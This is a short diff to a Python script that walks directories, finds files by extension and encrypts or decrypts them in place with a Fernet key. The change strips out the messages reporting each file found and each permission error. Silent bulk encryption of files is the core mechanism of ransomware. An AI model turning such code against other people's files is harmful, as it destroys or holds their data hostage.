@@ -20,7 +20,6 @@ def find_files(file_type):
         for filename in filenames:
             if filename.endswith(file_type):
                 full_path = os.path.join(parent, filename)
-                print(f"Found file: {full_path}")
                 yield full_path
 
 def encrypt(filename, key):
@@ -32,7 +31,6 @@ def encrypt(filename, key):
         with open(filename, 'wb') as file:
             file.write(encrypted)
     except PermissionError as e:
-        print(f"PermissionError: {e}. Skipping file: {filename}")
         pass
 
 def decrypt(filename, key):
@@ -44,7 +42,6 @@ def decrypt(filename, key):
         with open(filename, 'wb') as file:
             file.write(decrypted)
     except PermissionError as e:
-        print(f"PermissionError: {e}. Skipping file: {filename}")
         pass
     except cryptography.fernet.InvalidToken as e:
         print(f"Invalid token, {e}. Skipping decryption for file: {filename}")
@@ -69,6 +66,7 @@ if __name__ == "__main__":
             decrypt(filename, key)
     else:
         raise TypeError("Either --encrypt or --decrypt must be specified.")
+
 
 
 
